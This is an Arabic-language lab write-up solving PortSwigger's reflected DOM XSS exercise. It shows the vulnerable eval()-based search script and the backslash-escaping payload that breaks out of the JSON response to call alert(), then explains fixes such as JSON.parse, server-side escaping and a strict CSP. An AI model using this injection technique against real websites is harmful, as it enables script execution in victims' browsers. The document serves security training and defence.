# [Reflected DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected)

## **`الهدف`**
قم بتنفيذ هجوم `XSS` يستدعي دالة `alert`.
## **`خطوات الحل`**
بعد الدخول إلى اللاب سنقوم باستخدام خاصية البحث ونضع أى نص عشوائي مميز مثل: `TESTTEST` ونقوم بإعتراض هذ الطلب ونفحص الاستجابة الخاصة به ثم نقوم بفحص الطلب الثاني الذي يحدث عشوائيًا وبعد ذلك نفحص الإستجابة الخاصة به وهي الأهم
```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 38

{
	"results":[
	],
	"searchTerm":"TESTTEST"
}
```
وسنجد أن الكلمة التى بحثنا بها يحدث لها انعكاس داخل `JSON` يُسمى `search-results` لذلك سنبحث داخل الـ `HTTP history` عن ملف JavaScript يُسمى `/resources/js/searchResults.js`
```http
HTTP/2 200 OK
Content-Type: application/javascript; charset=utf-8
Cache-Control: public, max-age=3600
X-Frame-Options: SAMEORIGIN
Content-Length: 2728

function search(path) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText);
            displaySearchResults(searchResultsObj);
        }
    };
    xhr.open("GET", path + window.location.search);
    xhr.send();

    function displaySearchResults(searchResultsObj) {
        var blogHeader = document.getElementsByClassName("blog-header")[0];
        var blogList = document.getElementsByClassName("blog-list")[0];
        var searchTerm = searchResultsObj.searchTerm
        var searchResults = searchResultsObj.results

        var h1 = document.createElement("h1");
        h1.innerText = searchResults.length + " search results for '" + searchTerm + "'";
        blogHeader.appendChild(h1);
        var hr = document.createElement("hr");
        blogHeader.appendChild(hr)

        for (var i = 0; i < searchResults.length; ++i)
        {
            var searchResult = searchResults[i];
            if (searchResult.id) {
                var blogLink = document.createElement("a");
                blogLink.setAttribute("href", "/post?postId=" + searchResult.id);

                if (searchResult.headerImage) {
                    var headerImage = document.createElement("img");
                    headerImage.setAttribute("src", "/image/" + searchResult.headerImage);
                    blogLink.appendChild(headerImage);
                }

                blogList.appendChild(blogLink);
            }

            blogList.innerHTML += "<br/>";

            if (searchResult.title) {
                var title = document.createElement("h2");
                title.innerText = searchResult.title;
                blogList.appendChild(title);
            }

            if (searchResult.summary) {
                var summary = document.createElement("p");
                summary.innerText = searchResult.summary;
                blogList.appendChild(summary);
            }

            if (searchResult.id) {
                var viewPostButton = document.createElement("a");
                viewPostButton.setAttribute("class", "button is-small");
                viewPostButton.setAttribute("href", "/post?postId=" + searchResult.id);
                viewPostButton.innerText = "View post";
            }
        }

        var linkback = document.createElement("div");
        linkback.setAttribute("class", "is-linkback");
        var backToBlog = document.createElement("a");
        backToBlog.setAttribute("href", "/");
        backToBlog.innerText = "Back to Blog";
        linkback.appendChild(backToBlog);
        blogList.appendChild(linkback);
    }
}
```
وسنلاحظ أن استجابة `JSON` تُستخدم مع استدعاء دالة `eval()`، وبعد عدة محاولات سنجد أنه يتم عمل هروب `Escaping` لعلامات الاقتباس `""` في استجابة `JSON`، ولكن لا يتم عمل هروب مع الشرطة المائلة العكسية `\`.

لذلك سنقوم بحقن الأمر التالي فى خانة البحث ونضغط `Search` لننتهي من حل اللاب.
```JS
\"-alert(1)}//
``` 

ونظرًا لأنك قمت بحقن شرطة مائلة عكسية `Backslash` `\` والموقع لا يقوم بعمل هروب `Escaping` لها، فعندما تحاول استجابة الـ `JSON` الهروب من رمز علامتي التنصيص المزدوجة المفتوحة، فإنه يضيف شرطة مائلة عكسية ثانية، وينتج عن ذلك شرطة مائلة مزدوجة `\\` تتسبب فعليًا في إلغاء عملية الهروب، وهذا يعني أنه يتم معالجة علامتي التنصيص المزدوجة دون هروب، مما يؤدي إلى إغلاق السلسلة النصية `String` التي كان يُفترض أن تحتوي على عبارة البحث.

ويُستخدم بعد ذلك عامل حسابي في هذه الحالة علامة الطرح `-` لفصل التعبيرات البرمجية قبل استدعاء دالة `alert()`، وأخيرًا، يقوم قوس الإغلاق المجعد `}` والشرطتان المائلتان للأمام `//` بإغلاق كائن الـ `JSON` مبكرًا وتحويل ما كان سيمثل بقية الكائن إلى تعليق برمجي `Comment`. ونتيجة لذلك، يتم إنشاء الاستجابة على النحو التالي:
```JSON
{"searchTerm":"\\"-alert(1)}//", "results":[]}
```
## **`ترقيع الثغرة`**
يجب التوقف عن تمرير المدخلات القادمة من المستخدم مثل المعلم `searchTerm` عبر استجابة الـ `JSON` مباشرة إلى مصبات غير آمنة `Sinks` مثل `eval` والتي تقوم بمعالجة البيانات كأكواد `JavaScript` وتسمح للمهاجم بكسر سياق كائن الـ `JSON`، واستبدالها بالدوال الآمنة والمخصصة لذلك مثل `JSON.parse` لتحليل البيانات برمجياً.

ويجب تعقيم أو عمل هروب `Escaping` لأي بيانات ديناميكية يتم معالجتها قبل تمريرها أو دمجها في استجابة الـ `JSON` من جهة السيرفر `Backend`، وذلك لضمان تحويل أي رموز خاصة `Special Characters` مثل الشرطة المائلة العكسية `\` أو علامات التنصيص المزدوجة `"` إلى نصوص آمنة لا يمكن للمتصفح تفسيرها كـ `Payload` خبيث يهدف لإنهاء السلسلة النصية `String` مبكراً.

وبما أن الهدف هنا هو مجرد معالجة الاستجابة واستخراج قيمة الـ `searchTerm` لعرضها في واجهة المستخدم `Frontend`، فيجب على المبرمجين الاعتماد على طرق آمنة مثل `JSON.parse` والتي تتعامل مع المدخلات كبيانات نصية مهيكلة `Structured Data` فقط، وتمنع تفعيل أي كود خبيث يتم حقنه مثل `alert` أو أي دوال أخرى.

وكطبقة حماية إضافية `Defense in Depth`، يجب على السيرفر إرسال ترويسة سياسة أمان المحتوى `CSP` صارمة تمنع تنفيذ أكواد `JS` عبر الدوال الخطيرة عن طريق عدم السماح بتوجيه `unsafe-eval`، فحتى لو فشل المطور في تأمين الكود برمجياً واستخدم `eval` ونجح المهاجم في الخروج من السلسلة النصية وحقن الكود، سيتدخل المتصفح ويمنع تنفيذ الـ `alert`.
